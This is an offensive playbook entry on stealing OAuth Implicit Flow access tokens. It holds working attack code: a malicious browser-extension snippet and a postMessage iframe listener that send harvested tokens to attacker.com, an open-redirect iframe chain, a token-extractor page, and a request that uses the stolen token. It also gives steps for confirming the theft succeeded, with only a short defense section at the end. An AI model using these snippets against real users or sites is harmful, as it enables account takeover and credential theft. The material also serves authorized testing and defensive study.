# OAuth — Implicit Flow Token Leakage

## When this applies

- Application uses `response_type=token` (Implicit Flow), where access tokens are delivered in the URL fragment.
- Goal: steal access tokens via browser history, Referer headers, server logs (if fragments are sent), postMessage leaks, or open redirect chains.

## Technique

Implicit Flow returns tokens like:
```
https://app.com/callback#access_token=TOKEN&expires_in=3600
```

The fragment (`#...`) is not sent with HTTP requests by default, BUT it is:
- Stored in browser history.
- Possibly sent in Referer header (depending on browser & policy).
- Logged by some browser plugins / parental controls / corporate proxies.
- Leaked via JavaScript `window.location.hash`.
- Forwarded if the page contains an open redirect.

## Steps

### 1. Identify Implicit Flow

Authorization request:
```http
GET /auth?client_id=ID&redirect_uri=...&response_type=token
                                       ^^^^^^^^^^^^^^^^^^^^
```

Authorization response:
```http
HTTP/1.1 302 Found
Location: https://app.com/callback#access_token=TOKEN&token_type=Bearer&expires_in=3600&scope=...
```

### 2. Browser history theft

When a victim's browser is shared/compromised, the URL with the fragment remains in history. Read with:

```javascript
// On a malicious extension
chrome.history.search({text: 'access_token', maxResults: 100}, function(results) {
    results.forEach(r => fetch('https://attacker.com/?u=' + encodeURIComponent(r.url)));
});
```

### 3. Referer header leak

Some legacy browsers send fragments in Referer when the next request is HTTP (not HTTPS). Modern browsers strip fragments. Test by inspecting Referer logs of subsequent navigations.

### 4. postMessage exfiltration

```html
<iframe src="OAUTH_URL_WITH_TOKEN_RESPONSE"></iframe>
<script>
window.addEventListener('message', function(e) {
    if (e.data.type === 'oauth_callback') {
        fetch('https://attacker.com/?token=' + e.data.token);
    }
});
</script>
```

When the OAuth callback page postMessages the token to its parent (a common pattern for popup-based OAuth), an iframe-embed of the page leaks the token to the attacker frame.

### 5. Open redirect chain

When `redirect_uri` allows an open redirect:

```html
<iframe
    src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/redirect?to=https://attacker.com&response_type=token&scope=openid">
</iframe>
```

Provider redirects to `victim.com/redirect?to=https://attacker.com#access_token=...`. The open redirect forwards to `attacker.com#access_token=...`, preserving the fragment. Attacker's page reads it from `window.location.hash`.

### 6. Token extractor page

```html
<!DOCTYPE html>
<html>
<body>
<script>
if (window.location.hash) {
    var fragment = window.location.hash.substring(1);
    var params = new URLSearchParams(fragment);
    var token = params.get('access_token');

    if (token) {
        fetch('/collect?token=' + encodeURIComponent(token));
    }
}
</script>
</body>
</html>
```

### 7. Validate stolen token

```http
GET /userinfo HTTP/1.1
Host: oauth-server.com
Authorization: Bearer STOLEN_TOKEN
```

Returns the victim's identity, confirming the theft.

### 8. Defense (for context)

The fix: switch to Authorization Code Flow + PKCE. The Code Flow delivers a short-lived `code` in URL parameters (not fragment), which can only be exchanged for a token using a `code_verifier` known only to the legitimate client.

## Verifying success

- Attacker server logs show requests with `?token=...` parameter shortly after victim follows the trap link.
- Stolen token authenticates against `/userinfo` and returns victim's identity.
- Logs at victim.com don't show suspicious activity (token is in fragment, not server-visible).

## Common pitfalls

- Modern OAuth providers and clients have largely abandoned Implicit Flow. OAuth 2.1 explicitly removes it.
- Some providers issue tokens via Implicit Flow but with very short lifetime (5–10 min) — token must be used quickly.
- postMessage targeted at `*` (any origin) is a common bug — restricted handlers (`postMessage(data, "https://specific.com")`) can't be exploited.
- Fragment-stripping policies (`Referrer-Policy: strict-origin-when-cross-origin` or stricter) prevent leakage via Referer.
- Browser history is local-only — exploitation requires physical/extension access to the victim's browser.

## Tools

- ngrok / Burp Collaborator for hosting attacker page.
- Burp Suite for crafting the OAuth flow with manipulated redirect_uri.
- Browser DevTools to trace the fragment.
- Service Worker / browser extension demos for advanced exfiltration.
